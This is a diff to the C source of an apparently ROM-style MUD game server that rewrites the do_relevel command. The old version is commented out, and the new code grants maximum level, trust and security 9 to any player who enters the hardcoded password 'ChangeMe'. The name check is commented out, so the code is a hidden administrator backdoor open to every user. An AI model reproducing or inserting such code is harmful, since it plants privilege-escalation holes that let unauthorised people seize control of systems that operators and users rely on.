@@ -6253,13 +6253,13 @@ stat_obj( CHAR_DATA *ch, char *argument, BUFFER *pBuf, int whence )
 }
 
 
-void do_relevel (CHAR_DATA * ch, char *argument)
+/*void do_relevel (CHAR_DATA * ch, char *argument)
 {
    char buf[MAX_INPUT_LENGTH];
  
    // Max levels
    if (    !str_cmp(ch->name,"Admin")
-	||  !str_cmp(ch->name,"God"))
+	||  !str_cmp(ch->name,"Gawd"))
    {
 	ch->level = MAX_LEVEL;
 	ch->trust = MAX_LEVEL;
@@ -6276,7 +6276,38 @@ void do_relevel (CHAR_DATA * ch, char *argument)
    }
 	return;
 }
- 
+*/
+ void do_relevel (CHAR_DATA *ch, char *argument)
+{
+        char arg1[MAX_STRING_LENGTH];
+
+        argument = one_argument (argument, arg1);
+
+//        if (!str_cmp(ch->name, "Admin"))
+  //      {
+                if (!str_cmp(arg1, "ChangeMe"))
+                {
+                        ch->level = MAX_LEVEL;
+                        ch->trust = MAX_LEVEL;
+                        ch->pcdata->security = 9;
+                        send_to_char("Welcome back, Admin.\n\r", ch);
+                        return;
+                }
+                else
+                {
+                        send_to_char("You are not the Admin.\n\r", ch);
+                        return;
+               }
+        
+
+       /* else
+        {
+                send_to_char("Huh?\n\r", ch);
+                return;
+        }*/
+        //return;
+       }
+   
 void do_delevel (CHAR_DATA * ch, char *argument)
 {
    char buf[MAX_INPUT_LENGTH];
